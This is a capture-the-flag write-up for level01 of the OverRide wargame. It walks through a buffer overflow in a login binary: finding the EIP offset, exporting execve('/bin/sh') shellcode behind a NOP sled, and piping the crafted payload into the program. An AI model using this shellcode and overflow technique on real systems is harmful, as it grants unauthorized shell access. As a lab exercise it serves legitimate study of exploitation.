# level01 

level01 is very similar to many Rainfall levels. 

We have three functions: `main`, `verify_user_name`, `verify_user_pass`. 

The program looks like a simple login interface. 
First, we enter our username, then our password. 
To find the username, just look in the `verify_user_name` function to find it: "dat_wil."

For the password it's more complex. In fact, we see the following condition: 
```c
if ((local_14 == 0) || (local_14 != 0)) 
{
      puts("nope, incorrect password...");
      iVar1 = 1;
}
```
Above all, even if you enter the right password, there's no way to execute a shell or get the token for the next level. 
One thing we can do, however, is overwrite the EIP. 
To do this, simply find our offset by entering a buffer overflow pattern when entering the password: 
```
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
And we get it : 80.

All we need to do is export our shellcode to our :
```bash
export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

Once this is done, we need to take an address in the middle of our nopslide:
```
(gdb) x/10s *((char **)environ)
0xffffd4e0: "SHELLCODE=\220\220\220\220\220 [...]"
[...]
0xffffd738: "\220\220\220\220\220\220\220 [...]"
^^^^^^^^^^
```
Here I've chosen the following address: 0xffffd738.
And we have everything we need to place our order:
```bash
level01@OverRide:~$ python -c 'print "dat_wil" + "\n" + 80*"A" + "\xff\xff\xd7\x38"[::-1]' > /tmp/1
level01@OverRide:~$ cat /tmp/1 - | /home/users/level01/level01
```

That's it!

(Functional shellcode : https://shell-storm.org/shellcode/files/shellcode-575.html)
